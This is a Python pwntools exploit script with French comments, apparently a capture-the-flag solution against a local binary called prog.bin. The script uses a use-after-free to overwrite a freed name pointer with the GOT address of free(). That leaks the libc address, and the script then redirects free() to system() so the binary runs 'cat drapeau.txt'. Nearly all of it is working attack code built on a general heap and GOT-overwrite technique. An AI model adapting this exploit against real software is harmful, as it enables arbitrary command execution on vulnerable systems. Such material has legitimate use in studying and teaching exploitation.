#! /usr/bin/env python2.7
# encoding: utf-8

from pwn import context, ELF, process, p64, u64, log, pause  # noqa: F403
import re


def aff(titre="", s=None):
    print("---------------+--------------------------------------------------------")
    if titre and s:
        for i in s.split('\n'):
            print("%-15s| %s" % (titre, i))


def ajout(nom="NOM", id="ID"):
    vp.sendline("1")                # nouvel élément
    vp.sendline(nom)                # nom
    vp.sendline(id)                 # id
    s = vp.recvuntil("sortie")
    aff("AJOUT", s)
    return s


def affichage():
    vp.sendline("2")                # affichage
    s = vp.recvuntil("sortie")
    aff("AFFICHAGE", s)
    return s


def change_nom(num=0, nom="NOUVEAU"):
    vp.sendline("4")
    vp.sendline(str(num))
    vp.sendline(nom)
    s = vp.recvuntil("sortie")
    aff("CHANGE_NOM", s)
    return s


def change_id(num=0, id="NOUVEAU"):
    vp.sendline("5")
    vp.sendline(str(num))
    vp.sendline(id)
    s = vp.recvuntil("sortie")
    aff("CHANGE_ID", s)
    return s


def detruire(num=0, quoi="id", exploit=False):
    vp.sendline("3")
    vp.sendline(str(num))
    vp.sendline({"id": "1", "nom": "2"}.get(quoi))
    s = vp.recvuntil("sortie")
    if exploit:
        print(s)
    else:
        aff("DETRUIRE_" + quoi.upper(), s)
    return s


def sortie():
    vp.sendline("6")


context.update(arch='amd64', os='linux')

velf = ELF("./prog.bin")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# lecture des informations statiques de prog.bin et de la libc
free_got = velf.got['free']
offset_free_system = libc.symbols['free'] - libc.symbols['system']

log.info("free_got: " + hex(free_got))
log.info("offset_free_system: " + hex(offset_free_system))

# lance prog.bin pour contrôler ses I/O
vp = process("./prog.bin")

aff("LANCEMENT", vp.recvuntil("sortie"))

# crée un élément avec le nom de même taille que la structure element
# et l'id la chaîne à passer à system()
ajout("A"*15, "cat drapeau.txt")  # élement 0

# libère le nom
detruire(0, "nom")

# alloue un nouvel élément: il va prendre la place libérée de nom
ajout("B"*30, "bb")  # élement 1

# écrit l'adresse de <free@got.plt> à la place de elements[0].nom
change_nom(0, p64(free_got)[0:3])

# demande l'affichage pour avoir l'adresse de free()
a = affichage()
free_addr = re.search(r'ment\[1\]\t\-> nom : (.+)\n', a)
free_addr = free_addr.group(1)  # free_addr est de la forme 0x7f8cba4cf510
free_addr = u64(free_addr + '\x00\x00')  # 6 octets -> 8 pour faire la conversion

# calcule l'adresse de system() à partir de celle de free()
system_addr = free_addr - offset_free_system

log.info("free   : " + hex(free_addr))
log.info("system : " + hex(system_addr))

# change l'indirection de free() par system() - les 6 premiers octets
change_nom(1, p64(system_addr)[:6])

# boom :)
# on appelle free() avec comme paramètre l'id de l'élément 0,
# mais en réalité c'est system() qui va s'exécuter
detruire(0, "id", exploit=True)

vp.clean_and_log()
aff()

pause()
